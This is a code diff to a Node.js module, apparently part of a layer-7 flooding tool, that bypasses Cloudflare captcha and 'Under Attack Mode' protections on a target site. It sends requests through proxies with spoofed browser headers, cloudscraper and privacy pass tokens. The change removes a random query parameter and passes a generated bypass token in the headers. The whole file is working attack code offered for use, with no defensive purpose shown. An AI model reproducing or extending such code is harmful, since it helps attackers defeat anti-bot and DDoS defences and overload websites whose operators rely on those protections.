@@ -1,12 +1,13 @@
 module.exports = function Cloudflare() {
     const privacypass = require('./privacypass'),
         cloudscraper = require('cloudscraper'),
-        request = require('request'),
-        fs = require('fs');
+        request = require('request');
     var privacyPassSupport = true;
+    var bypassHeader = false;
+
     function useNewToken() {
-        privacypass(l7.target);
-        console.log('[cloudflare-bypass ~ privacypass]: generated new token');
+        bypassHeader = privacypass(l7.target);
+        console.log('[cloudflare-bypass ~ privacypass]: generated new token ::', bypassHeader);
     }
 
     if (l7.firewall[1] == 'captcha') {
@@ -15,11 +16,10 @@ module.exports = function Cloudflare() {
     }
 
     function bypass(proxy, uagent, callback, force) {
-        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
         var cookie = "";
         if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
             request.get({
-                url: l7.target + "?_asds=" + num,
+                url: l7.target,
                 gzip: true,
                 proxy: proxy,
                 headers: {
@@ -36,7 +36,7 @@ module.exports = function Cloudflare() {
                     return false;
                 }
                 if (res.headers['cf-chl-bypass'] && res.headers['set-cookie']) {
-
+                    
                 } else {
                     if (l7.firewall[1] == 'captcha') {
                         logger('[cloudflare-bypass]: The target is not supporting privacypass');
@@ -45,11 +45,11 @@ module.exports = function Cloudflare() {
                         privacyPassSupport = false;
                     }
                 }
-
+    
                 cookie = res.headers['set-cookie'].shift().split(';').shift();
                 if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
                     cloudscraper.get({
-                        url: l7.target + "?_asds=" + num,
+                        url: l7.target,
                         gzip: true,
                         proxy: proxy,
                         headers: {
@@ -60,7 +60,7 @@ module.exports = function Cloudflare() {
                             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                             'Accept-Encoding': 'gzip, deflate, br',
                             'Accept-Language': 'en-US;q=0.9',
-                            'challenge-bypass-token': l7.privacypass,
+                            'challenge-bypass-token': bypassHeader,
                             "Cookie": cookie
                         }
                     }, (err, res) => {
@@ -68,7 +68,7 @@ module.exports = function Cloudflare() {
                         if (res.headers['set-cookie']) {
                             cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                             cloudscraper.get({
-                                url: l7.target + "?_asds=" + num,
+                                url: l7.target,
                                 proxy: proxy,
                                 headers: {
                                     'Connection': 'Keep-Alive',
@@ -113,7 +113,7 @@ module.exports = function Cloudflare() {
                     });
                 } else {
                     cloudscraper.get({
-                        url: l7.target + "?_asds=" + num,
+                        url: l7.target,
                         proxy: proxy,
                         headers: {
                             'Connection': 'Keep-Alive',
@@ -137,7 +137,7 @@ module.exports = function Cloudflare() {
             });
         } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
             cloudscraper.get({
-                url: l7.target + "?_asds=" + num,
+                url: l7.target,
                 proxy: proxy,
                 headers: {
                     'Upgrade-Insecure-Requests': 1,
@@ -157,12 +157,12 @@ module.exports = function Cloudflare() {
                         return bypass(proxy, uagent, callback, true);
                     }
                 } else {
-
+    
                 }
             });
         } else {
             cloudscraper.get({
-                url: l7.target + "?_asds=" + num,
+                url: l7.target,
                 gzip: true,
                 proxy: proxy,
                 headers: {
